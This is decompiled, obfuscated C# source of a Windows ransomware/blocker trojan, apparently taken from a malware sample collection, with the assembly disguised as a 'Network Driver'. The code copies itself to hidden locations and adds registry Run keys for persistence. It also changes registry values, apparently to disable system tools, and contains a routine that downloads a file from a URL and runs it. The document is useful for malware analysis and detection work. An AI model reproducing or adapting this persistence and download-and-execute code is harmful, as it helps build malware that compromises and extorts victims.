// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Network Driver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 31A0C38B-3584-42BE-8C71-509BA5DF4465
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.cnvx-6c4df7ef35e4d5aa4c5d4df1ed2dc33691c7736a.exe

using \u0001;
using \u0004;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0004
{
  internal sealed class \u0005
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    private static Mutex \u0001;

    public static void \u0003()
    {
      \u0004.\u0005.\u0007();
      \u0004.\u0005.\u0006();
      \u0004.\u0005.\u0004();
      \u0005.\u0003.\u0003();
      \u0003.\u0005.\u0003();
    }

    private static void \u0004()
    {
      string str1 = \u0090\u0002.\u007E\u0008\u0005((object) \u0014\u0002.\u007E\u0002\u0005((object) \u0014\u0003.\u0004\u0005()));
      \u0004.\u0004.\u000F[0] = \u008E\u0003.\u0098(\u0013\u0002.\u001B\u0002(Environment.SpecialFolder.ApplicationData), \u0004.\u0005.\u0001(925), \u0004.\u0004.\u000F[0]);
      \u0004.\u0004.\u000F[1] = \u008E\u0003.\u0098(\u0008\u0003.\u0019\u0002(\u0004.\u0005.\u0001(916)), \u0004.\u0005.\u0001(925), \u0004.\u0004.\u000F[1]);
      if (\u0004.\u0005.\u0003())
        return;
      try
      {
        foreach (string str2 in \u0004.\u0004.\u000F)
        {
          if (!\u0002.\u0003(str2))
            \u0004\u0003.\u009A\u0003(str1, str2);
          \u0083\u0002.\u009D\u0003(str2, FileAttributes.Hidden);
        }
      }
      catch
      {
      }
      try
      {
        \u0003\u0003.\u007E\u008D\u0003((object) \u0092\u0003.\u007E\u008A\u0003((object) Registry.CurrentUser, \u0004.\u0005.\u0001(1358), true), \u0004.\u0004.\u0010[0], (object) \u0004.\u0004.\u000F[0]);
        \u0003\u0003.\u007E\u008D\u0003((object) \u0092\u0003.\u007E\u008A\u0003((object) Registry.CurrentUser, \u0004.\u0005.\u0001(1419), true), \u0004.\u0004.\u0010[1], (object) \u0004.\u0004.\u000F[1]);
      }
      catch
      {
      }
      try
      {
        \u0090\u0003.\u007E\u0091\u0002((object) \u0004.\u0005.\u0001);
        foreach (string str3 in \u0004.\u0004.\u000F)
        {
          Process process = \u0015\u0003.\u0006\u0005(str3, string.Empty);
        }
      }
      catch
      {
      }
      \u001C\u0002.\u0017\u0002(0);
    }

    public static void \u0003([In] string obj0)
    {
      try
      {
        \u0090\u0003.\u007E\u0091\u0002((object) \u0004.\u0005.\u0001);
      }
      catch
      {
      }
      try
      {
        WebClient webClient = new WebClient();
        string str1 = \u0091\u0003.\u0097(\u0002.\u0003(\u0002\u0003.\u007E\u0084\u0002((object) new Random(), 5, 12)), \u0004.\u0005.\u0001(907));
        string str2 = \u008E\u0003.\u0098(\u0008\u0003.\u0019\u0002(\u0004.\u0005.\u0001(916)), \u0004.\u0005.\u0001(925), str1);
        if (!\u0088\u0002.\u007E\u0090((object) obj0, \u0004.\u0005.\u0001(930)))
          obj0 = \u0091\u0003.\u0097(\u0004.\u0005.\u0001(930), obj0);
        \u0011\u0003.\u007E\u008F\u0004((object) webClient, obj0, str2);
        Process process = \u009E.\u0005\u0005(str2);
        \u0090\u0003.\u007E\u001E\u0004((object) webClient);
      }
      catch
      {
      }
      \u0004.\u0005.\u0005();
    }

    public static void \u0005()
    {
      \u0005.\u0003.\u0004();
      try
      {
        \u0087\u0002.\u007E\u0089\u0003((object) \u0092\u0003.\u007E\u008A\u0003((object) Registry.CurrentUser, \u0004.\u0005.\u0001(1358), true), \u0004.\u0004.\u0010[0]);
        \u0087\u0002.\u007E\u0089\u0003((object) \u0092\u0003.\u007E\u008A\u0003((object) Registry.CurrentUser, \u0004.\u0005.\u0001(1419), true), \u0004.\u0004.\u0010[1]);
      }
      catch
      {
      }
      try
      {
        foreach (string str in \u0004.\u0004.\u000F)
          \u008E\u0002.\u009B\u0003(str);
      }
      catch
      {
      }
      \u001C\u0002.\u0017\u0002(0);
    }

    private static void \u0006()
    {
      try
      {
        \u0086\u0002.\u007E\u008E\u0003((object) \u0092\u0003.\u007E\u008A\u0003((object) Registry.CurrentUser, \u0004.\u0005.\u0001(1504), true), \u0004.\u0005.\u0001(1585), (object) \u0004.\u0005.\u0001(1594), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        \u0086\u0002.\u007E\u008E\u0003((object) \u0092\u0003.\u007E\u008A\u0003((object) Registry.CurrentUser, \u0004.\u0005.\u0001(1504), true), \u0004.\u0005.\u0001(1599), (object) \u0004.\u0005.\u0001(1624), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        \u0086\u0002.\u007E\u008E\u0003((object) \u0092\u0003.\u007E\u008A\u0003((object) Registry.CurrentUser, \u0004.\u0005.\u0001(1629), true), \u0004.\u0005.\u0001(1706), (object) \u0004.\u0005.\u0001(1624), RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static bool \u0003()
    {
      string[] strArray = \u0004.\u0004.\u000F;
      for (int index = 0; index < strArray.Length; index++)
      {
        if (!\u0002.\u0003(strArray[index]))
          return false;
      }
      return true;
    }

    private static void \u0007()
    {
      try
      {
        \u0004.\u0005.\u0001 = new Mutex(true, \u0004.\u0004.\u0001);
        \u0090\u0003.\u007E\u0095\u0002((object) \u0004.\u0005.\u0001);
      }
      catch
      {
        \u001C\u0002.\u0017\u0002(0);
      }
    }

    static \u0005() => \u0001.\u0003.\u0003();
  }
}
